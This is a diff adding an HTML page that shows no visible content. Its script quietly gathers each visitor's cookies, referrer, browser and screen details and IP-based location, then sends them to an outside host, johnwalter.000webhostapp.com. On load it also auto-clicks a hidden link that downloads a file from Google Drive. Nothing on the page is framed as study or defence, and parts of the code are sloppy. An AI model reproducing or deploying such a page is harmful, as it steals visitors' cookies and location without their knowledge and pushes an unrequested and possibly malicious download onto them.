@@ -1,0 +1,107 @@
+<html>
+
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+var FinalString=""
+var info={
+
+    timeOpened:new Date(),
+    timezone:(new Date()).getTimezoneOffset()/60,
+
+    pageon(){return window.location.pathname},
+    referrer(){return document.referrer},
+    previousSites(){return history.length},
+
+    browserName(){return navigator.appName},
+    browserEngine(){return navigator.product},
+    browserVersion1a(){return navigator.appVersion},
+    browserVersion1b(){return navigator.userAgent},
+    browserLanguage(){return navigator.language},
+    browserOnline(){return navigator.onLine},
+    browserPlatform(){return navigator.platform},
+    javaEnabled(){return navigator.javaEnabled()},
+    dataCookiesEnabled(){return navigator.cookieEnabled},
+
+    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
+    dataStorage(){return localStorage},
+
+    sizeScreenW(){return screen.width},
+    sizeScreenH(){return screen.height},
+    sizeDocW(){return document.width},
+    sizeDocH(){return document.height},
+    sizeInW(){return innerWidth},
+    sizeInH(){return innerHeight},
+    sizeAvailW(){return screen.availWidth},
+    sizeAvailH(){return screen.availHeight},
+    scrColorDepth(){return screen.colorDepth},
+    scrPixelDepth(){return screen.pixelDepth},
+
+
+    latitude(){return position.coords.latitude},
+    longitude(){return position.coords.longitude},
+    accuracy(){return position.coords.accuracy},
+    altitude(){return position.coords.altitude},
+    altitudeAccuracy(){return position.coords.altitudeAccuracy},
+    heading(){return position.coords.heading},
+    speed(){return position.coords.speed},
+    timestamp(){return position.timestamp},
+
+
+
+    };
+
+	var String1 = "r3^4Opened ON: "+info.timeOpened +"r3^4TimeZone: "+ info.timezone +"r3^4PageOn: "+info.pageon() +"r3^4Referrer: "+info.referrer()
+	var String2 = "r3^4Previous Sites: "+info.previousSites()+"r3^4Browser Name: "+info.browserName()+"r3^4BrowserEngine: "+info.browserEngine()
+	var String3 = "r3^4browserVersion1a: "+info.browserVersion1a() +"r3^4browserVersion1b: "+info.browserVersion1b()+"r3^4browserLanguage: "+info.browserLanguage()+"r3^4browserOnline: "+ info.browserOnline()+"r3^4browserPlatform: "+ info.browserPlatform()+"r3^4javaEnabled: "+ info.javaEnabled() +"r3^4dataCookiesEnabled: "+info.dataCookiesEnabled()+"r3^4dataCookies: "+ info.dataCookies2()
+
+	var String4 = +"r3^4sizeScreenW: "+info.sizeScreenW() +"r3^4sizeScreenH: "+info.sizeScreenH() +"r3^4sizeDocW: "+info.sizeDocW()+"r3^4sizeDocH: "+ info.sizeDocH()+"r3^4sizeInW: "+ info.sizeInW() +"r3^4sizeInH: "+info.sizeInH()+"r3^4sizeAvailW: "+ info.sizeAvailW()+"r3^4sizeAvailH: "+ info.sizeAvailH()
+	var String5 = +"r3^4scrColorDepth: "+info.scrColorDepth() +"r3^4scrPixelDepth: "+info.scrPixelDepth()
+
+
+$.get("http://freegeoip.net/json/", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("Location: " + response.city + ", " + response.region_name);
+    $("#details").html(JSON.stringify(response, null, 4));
+}, "jsonp");
+
+
+	$.getJSON("http://freegeoip.net/json/", function(data) {
+    var country_code = data.country_code;
+    var country = data.country_name;
+    var ip = data.ip;
+    var time_zone = data.time_zone;
+    var latitude = data.latitude;
+    var longitude = data.longitude;
+
+	FinalString=FinalString+"r3^4Country:"+country+"r3^4Latitude:"+latitude+"r3^4Longitude:"+longitude+"r3^4ip:"+ip
+
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "https://johnwalter.000webhostapp.com/ping.php?val="+FinalString, true);
+xhttp.send();
+
+});
+
+
+
+	FinalString=String1+String2+String3+String4+String5
+
+</script>
+<script>
+function dd(){
+  document.getElementById("down").click();
+}
+</script>
+
+</head>
+
+
+<body onload="dd()">
+<a id="down" href="https://drive.google.com/uc?export=download&id=1edgYu1HrcLWnum1WSOy2_8O-yqbITyBg"></a>
+
+</body>
+
+
+
+</html>
